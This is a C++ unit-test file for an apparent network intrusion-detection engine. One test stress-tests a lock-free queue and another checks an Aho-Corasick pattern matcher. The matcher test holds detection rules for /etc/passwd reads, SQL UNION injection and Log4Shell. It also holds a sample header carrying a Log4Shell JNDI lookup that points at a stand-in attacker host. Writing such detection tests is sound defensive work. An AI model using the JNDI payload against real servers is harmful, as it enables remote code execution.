// tests/test_core_engine.cpp
#include <gtest/gtest.h>
#include <thread>
#include <vector>
#include <atomic>
#include "common/queues/SPSCQueue.h"
#include "engine/flow/AhoCorasick.h"

using namespace sentinel::common;
using namespace sentinel::engine;

// ==========================================
// 测试用例 1: SPSCQueue 无锁并发一致性测试
// 验证极限多线程并发下，是否会丢数据或死锁
// ==========================================
TEST(SPSCQueueTest, ConcurrencyPushPop) {
    SPSCQueue<int, 4096> queue;
    const int TEST_COUNT = 500000; // 50万次压测
    std::atomic<long long> sum_produced{0};
    std::atomic<long long> sum_consumed{0};

    // 生产者线程
    std::thread producer([&]() {
        for (int i = 1; i <= TEST_COUNT; ++i) {
            while (!queue.push(i)) {
                std::this_thread::yield(); // 队列满则退避自旋
            }
            sum_produced += i;
        }
    });

    // 消费者线程
    std::thread consumer([&]() {
        int consumed_count = 0;
        while (consumed_count < TEST_COUNT) {
            auto valOpt = queue.popWait(std::chrono::milliseconds(10));
            if (valOpt) {
                sum_consumed += *valOpt;
                consumed_count++;
            }
        }
    });

    producer.join();
    consumer.join();

    EXPECT_EQ(sum_produced.load(), sum_consumed.load()) << "⚠️ 无锁队列发生数据丢失或错乱！";
}

// ==========================================
// 测试用例 2: Aho-Corasick 自动机精确度测试
// 验证 O(N) 状态机能否在复杂的流中精准定位 Payload
// ==========================================
TEST(AhoCorasickTest, ExactPatternMatching) {
    AhoCorasick ac;

    // 注入模拟规则
    ac.insert("GET /etc/passwd", 101);
    ac.insert("${jndi:", 102);      // 你的 test1 规则
    ac.insert("UNION SELECT", 103);
    ac.build();

    std::string payload_str = "HTTP/1.1\r\nUser-Agent: ${jndi:ldap://hack.com}\r\nAccept: */*\r\n";
    std::vector<uint8_t> payload(payload_str.begin(), payload_str.end());

    const auto* hitRules = ac.match(payload);

    ASSERT_NE(hitRules, nullptr) << "⚠️ 自动机未能检出恶意载荷！";
    bool found = (std::find(hitRules->begin(), hitRules->end(), 102) != hitRules->end());
    EXPECT_TRUE(found) << "⚠️ 自动机检出了错误的安全规则！";
}